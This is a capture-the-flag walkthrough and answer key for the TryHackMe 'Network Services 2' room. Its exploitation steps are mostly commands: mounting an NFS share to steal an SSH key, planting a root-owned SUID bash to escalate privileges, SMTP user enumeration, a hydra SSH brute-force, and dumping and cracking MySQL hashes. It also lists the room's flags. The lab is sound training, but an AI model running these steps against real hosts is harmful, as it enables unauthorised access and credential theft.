# THM - Network Services 2

<br>

## Task 2

https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

https://www.datto.com/blog/what-is-nfs-file-share

http://nfs.sourceforge.net/

https://wiki.archlinux.org/title/NFS

### Task 2.1

> Network File System

### Task 2.2

> mounting

### Task 2.3

> file handle

### Task 2.4

> RPC

### Task 2.5

> user ID / group ID

### Task 2.6

> Y

### Task 2.7

> Y

### Task 2.8

🧰 https://en.wikipedia.org/wiki/Network_File_System#:~:text=NFS%20version%204.2%20(RFC%207862,operations%20for%20pNFS%20(LAYOUTERROR%20and

> 4.2

<br>

## Task 3

https://resources.infosecinstitute.com/topic/what-is-enumeration/

### Task 3.1

```shell
mkdir nmap
nmap -A -oN nmap/initial -p- 10.10.35.226
```

> 7

### Task 3.2

> 2049

### Task 3.3

```shell
showmount -e 10.10.35.226
```

> /home

### Task 3.4

```shell
mkdir /tmp/mount
sudo mount -t nfs 10.10.35.226:/home /tmp/mount -nolock

cd /tmp/mount/
ls
```

> cappucino

### Task 3.6

```shell
cd cappucino/
ls -al
```

> .ssh

### Task 3.7

```shell
cd .ssh/
ls
```

> id_rsa

### Task 3.8

```shell
cp id_rsa .../TryHackMe/Rooms/networkservices2/id_rsa

cd .../TryHackMe/Rooms/networkservices2/
chmod 600 id_rsa
sudo ssh -i id_rsa cappucino@10.10.35.226
```

> Y

<br>

## Task 4

🧰 https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

```shell
cp bash /tmp/mount/cappucino/bash

cd /tmp/mount/cappucino/
sudo chown root bash
```

### Task 4.3

```shell
sudo chmod +s bash
```

> s

### Task 4.4

```shell
ls -la bash
```

> -rwsr-sr-x

### Task 4.6

```shell
(ssh:)
	./bash -p
		cd /root/
		ls
		cat root.txt
```

> THM{nfs_got_pwned}

<br>

## Task 5

https://computer.howstuffworks.com/e-mail-messaging/email3.htm

https://www.afternerd.com/blog/smtp/

### Task 5.1

> Simple Mail Transfer Protocol

### Task 5.2

> emails

### Task 5.3

> SMTP handshake

### Task 5.4

> 25

### Task 5.5

> SMTP queue

### Task 5.6

> POP/IMAP

### Task 5.7

> Y

### Task 5.8

> Y

<br>

## Task 6

### Task 6.1

```shell
nmap -A -oN nmap/initial2 -p- 10.10.237.102
```

> 25

### Task 6.2

> msfconsole

### Task 6.3

```shell
msfconsole
	search smtp_version
```

> auxiliary/scanner/smtp/smtp_version

### Task 6.4

```shell
	use 0
		show options
```

> options

### Task 6.5

> RHOSTS

### Task 6.6

```shell
		set RHOSTS 10.10.237.102
		run
```

> polosmtp.home

### Task 6.7

🧰 https://mailtrap.io/blog/mail-transfer-agent/

> Postfix

### Task 6.8

```shell
		search smtp_enum
```

> auxiliary/scanner/smtp/smtp_enum

### Task 6.9

```shell
	use 0
		show options
		set USER_FILE ../../Tools/SecLists/Usernames/top-usernames-shortlist.txt
```

> USER_FILE

### Task 6.10

```shell
		set RHOSTS 10.10.237.102
```

> RHOSTS

### Task 6.12

```shell
		run
```

> administrator

```shell
		exit
```

<br>

## Task 7

### Task 7.1

```shell
hydra -t 10 -l administrator -P ../../Tools/KaliWordlists/rockyou.txt -vV 10.10.237.102 ssh
```

> alejandro

### Task 7.2

```shell
ssh administrator@10.10.237.102
	yes
	alejandro
	
	ls
	cat smtp.txt
```

> THM{who_knew_email_servers_were_c00l?}

<br>

## Task 8

https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html 

https://www.w3schools.com/php/php_mysql_intro.asp

### Task 8.1

> relational database management system

### Task 8.2

> SQL

### Task 8.3

> client-server

### Task 8.4

> back end database

### Task 8.5

> Facebook

<br>

## Task 9

https://nmap.org/nsedoc/scripts/mysql-enum.html

https://www.exploit-db.com/exploits/23081

### Task 9.1

```shell
nmap -A -oN nmap/initial3 -p- 10.10.15.100
```

> 3306

### Task 9.4

```shell
mysql -h 10.10.15.100 -u root -p
	password

	exit
msfconsole
	search mysql_sql
	use auxiliary/admin/mysql/mysql_sql
		show options
```

> PASSWORD/RHOSTS/USERNAME

### Task 9.5

```shell
		set PASSWORD password
		set RHOSTS 10.10.15.100
		set USERNAME root
		run
```

> 5.7.29-0ubuntu0.18.04.1

### Task 9.6

```shell
		set SQL show databases
		run
```

> 4

<br>

## Task 10

### Task 10.1

```shell
		search mysql_schemadump
	use auxiliary/scanner/mysql/mysql_schemadump
```

> auxiliary/scanner/mysql/mysql_schemadump

### Task 10.2

```shell
		show options
		set PASSWORD password
		set RHOSTS 10.10.15.100
		set USERNAME root
		run
```

> waits_global_by_latency

### Task 10.3

```shell
		search mysql_hashdump
	use auxiliary/scanner/mysql/mysql_hashdump
```

> auxiliary/scanner/mysql/mysql_hashdump

### Task 10.4

```shell
		show options
		set PASSWORD password
		set RHOSTS 10.10.15.100
		set USERNAME root
		run
```

> carl

```shell
echo "carl:*EA031893AA21444B170FC2162A56978B8CEECE18" > hash.txt
```

### Task 10.5

> carl:*EA031893AA21444B170FC2162A56978B8CEECE18

### Task 10.6

```shell
john hash.txt
```

> doggie

### Task 10.7

```shell
ssh carl@10.10.15.100
	yes
	doggie
	
	ls
	cat MySQL.txt
```

> THM{congratulations_you_got_the_mySQL_flag}

<br>

https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html

https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/





